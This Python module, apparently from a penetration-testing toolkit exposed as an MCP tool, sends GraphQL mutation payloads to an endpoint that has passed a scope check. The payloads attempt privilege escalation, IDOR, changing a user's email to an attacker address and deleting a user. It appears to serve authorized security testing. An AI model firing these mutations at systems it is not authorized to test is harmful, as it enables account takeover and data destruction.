"""GraphQL Mutation Testing Module"""
import httpx
import json
import logging
from mcp_instance import mcp
from tools.http_utils import secure_request_sync, get_sync_client
from tools.db import is_in_scope

logger = logging.getLogger("stealthvision")
from config import USER_AGENT, DEFAULT_TIMEOUT

GRAPHQL_MUTATION_PAYLOADS = {
    "privilege_escalation": [
        {"query": "mutation { updateRole(userId: 1, role: \"ADMIN\") { success } }"},
        {"query": "mutation { changePermission(permission: \"WRITE\", value: true) { ok } }"},
    ],
    "data_modification": [
        {"query": "mutation { updateUser(id: 1, email: \"attacker@evil.com\") { success } }"},
        {"query": "mutation { deleteUser(id: 1) { success } }"},
    ],
    "idor": [
        {"query": "mutation { updateProfile(userId: 1, data: {level: \"admin\"}) { user { id role } } }"},
        {"query": "mutation { updateSettings(userId: 1, settings: {privileged: true}) { success } }"},
    ],
}

@mcp.tool()
def graphql_mutation_test(endpoint: str, target_id: int, mutation_type: str = "privilege_escalation", introspection: bool = True) -> dict:
    """Test GraphQL mutations for privilege escalation and IDOR."""
    if not is_in_scope(target_id, endpoint):
        return {"error": f"URL {endpoint} is out of scope for target {target_id}. Scan aborted.", "success": False}
    
    client = get_sync_client()
    results = []
    
    try:
        payloads = GRAPHQL_MUTATION_PAYLOADS.get(mutation_type, GRAPHQL_MUTATION_PAYLOADS["privilege_escalation"])
        for payload in payloads:
            try:
                resp = secure_request_sync(
                    client, "POST",
                    endpoint,
                    target_id,
                    json=payload,
                    timeout=10.0
                )
                if resp.status_code == 200:
                    results.append({"payload": payload, "status": resp.status_code, "response": resp.text[:200]})
                else:
                    results.append({"payload": payload, "status": resp.status_code, "error": "Request failed"})
            except Exception as e:
                results.append({"payload": payload, "error": str(e)})
    finally:
        client.close()
    
    return {"endpoint": endpoint, "mutation_type": mutation_type, "results": results}